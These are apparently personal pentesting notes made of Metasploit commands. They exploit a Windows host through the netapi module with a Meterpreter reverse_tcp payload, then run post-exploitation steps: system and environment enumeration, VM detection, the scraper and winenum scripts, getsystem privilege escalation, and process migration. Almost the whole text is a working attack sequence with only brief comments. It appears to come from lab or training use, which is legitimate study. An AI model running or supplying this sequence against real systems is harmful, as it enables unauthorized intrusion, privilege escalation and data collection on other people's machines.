search netapi

use netapi

set RHOST 192.168.1.8

set PAYLOAD windows/meterpreter/reverse_tcp

exploit

# metepreter shell
sysinfo

getuid

getpid


# check if user logged in with idletime
idletime

# check if machine is runnning in a virtual machine
run checkvm

# check the enviornment on the target machine
run get_env

# ipconfig
ipconfig

# get list of running applications
run get_application_list

# get info ffrom the target
run scraper

# info dumped to this location on attacker machine
cd ~/./msf4/logs/scripts/scraper/ipaddress

# run winenum to enumerate target
run winenum

# winenum log location
# /root/.msf4/logs/scripts/winenum/machine


# Privilege Escalaion
# ===================

# getsystem
getsystem -h

getsystem -t 0

# getuid
getuid

# revert to previous priviliges
rev2self

# migrate to process
ps

# migrate to process id
migrate 1908

getuid
